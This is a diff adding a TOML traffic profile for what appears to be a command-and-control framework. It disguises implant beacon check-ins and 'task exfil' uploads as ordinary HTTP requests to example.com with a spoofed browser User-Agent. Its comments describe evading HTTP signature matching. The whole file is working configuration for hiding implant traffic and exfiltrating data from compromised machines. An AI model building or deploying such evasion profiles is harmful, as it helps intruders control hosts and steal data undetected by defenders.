@@ -1,0 +1,124 @@
+[profile]
+name = "HTTP Mimicry"
+author = "LongHaul Team"
+
+# ==========================================================================
+# RAW - HTTP/1.1 Protocol Mimicry (TCP)
+# ==========================================================================
+#
+# Usage:
+#   1. Create a raw listener: POST /api/v1/listeners with
+#        listener_type = "raw"
+#        listener_port = 80  (or any port for testing)
+#        listener_profile_contents = <contents of this file>
+#
+# Wire format — client to server:
+#
+#   GET (beacon):
+#     GET /update?sid=<base64url(msgpack)> HTTP/1.1\r\n
+#     Host: example.com\r\n
+#     User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) ...\r\n
+#     Accept: */*\r\n
+#     Connection: close\r\n
+#     \r\n
+#
+#   POST (exfil):
+#     POST /upload HTTP/1.1\r\n
+#     Host: example.com\r\n
+#     User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) ...\r\n
+#     Content-Type: application/x-www-form-urlencoded\r\n
+#     \r\n
+#     data=<base64url(msgpack)>
+#
+# Wire format — server to client:
+#
+#   GET response:
+#     HTTP/1.1 200 OK\r\n
+#     Content-Type: application/octet-stream\r\n
+#     \r\n
+#     <base64url(tasks)>
+#
+#   POST ACK:
+#     HTTP/1.1 200 OK\r\n
+#     \r\n
+#
+# Mimicry level:
+#   Produces wire traffic that Wireshark identifies as HTTP. Content-Length
+#   headers are omitted intentionally — the server extracts the payload
+#   positionally (transform reversal), so length fields are never validated.
+#   One TCP connection per request/response (HTTP/1.0 style despite the
+#   HTTP/1.1 version string). Will pass basic HTTP signature matching.
+#   Will not survive deep session inspection expecting persistent connections
+#   or correct Content-Length fields.
+#
+# Disambiguation:
+#   GET packets start with "GET " (0x47 0x45 0x54 0x20).
+#   POST packets start with "POST" (0x50 0x4F 0x53 0x54).
+#   Byte 0 differs (G=0x47 vs P=0x50), so prefix routing is unambiguous.
+# ==========================================================================
+
+
+# --------------------------------------------------------------------------
+# GET — Beacon check-in (implant → server)
+# --------------------------------------------------------------------------
+[raw.get]
+proto = "tcp"
+body = "<METADATA>"
+
+[raw.get.client.metadata]
+# Transform chain applied to msgpack beacon metadata before wire send:
+#   1. base64url-encode
+#   2. prepend "GET /update?sid="
+#   3. append " HTTP/1.1\r\nHost: ...\r\n\r\n"
+#
+# Wire result:
+#   GET /update?sid=<base64url> HTTP/1.1\r\nHost: example.com\r\n...\r\n\r\n
+# Server reverses: strip HTTP headers suffix, strip "GET /update?sid=" prefix,
+#                  base64url-decode.
+transforms = [
+    { op = "base64url" },
+    { op = "prepend", val = 'GET /update?sid=' },
+    { op = "append",  val = ' HTTP/1.1\x0D\x0AHost: example.com\x0D\x0AUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36\x0D\x0AAccept: */*\x0D\x0AConnection: close\x0D\x0A\x0D\x0A' },
+]
+
+[raw.get.server]
+body = "<OUTPUT>"
+
+[raw.get.server.output]
+# Transform chain applied to task bytes before the server sends them back:
+#   1. base64url-encode
+#   2. prepend HTTP/1.1 200 response headers
+#
+# Wire result:
+#   HTTP/1.1 200 OK\r\nContent-Type: application/octet-stream\r\n\r\n<base64url>
+# Implant reverses: strip "HTTP/1.1 200 OK\r\n...\r\n\r\n" prefix,
+#                   base64url-decode.
+transforms = [
+    { op = "base64url" },
+    { op = "prepend", val = 'HTTP/1.1 200 OK\x0D\x0AContent-Type: application/octet-stream\x0D\x0A\x0D\x0A' },
+]
+
+
+# --------------------------------------------------------------------------
+# POST — Task exfil (implant → server)
+# --------------------------------------------------------------------------
+[raw.post]
+proto = "tcp"
+body = "<OUTPUT>"
+
+[raw.post.client.output]
+# Transform chain applied to msgpack exfil payload before wire send:
+#   1. base64url-encode
+#   2. prepend full HTTP POST request headers + body field name
+#
+# Wire result:
+#   POST /upload HTTP/1.1\r\nHost: example.com\r\n...\r\n\r\ndata=<base64url>
+transforms = [
+    { op = "base64url" },
+    { op = "prepend", val = 'POST /upload HTTP/1.1\x0D\x0AHost: example.com\x0D\x0AUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36\x0D\x0AContent-Type: application/x-www-form-urlencoded\x0D\x0A\x0D\x0Adata=' },
+]
+
+[raw.post.server]
+# Standard HTTP 200 OK acknowledgement with no body.
+# TOML \r\n escapes produce the correct CR LF bytes on the wire.
+body = "HTTP/1.1 200 OK\r\n\r\n"
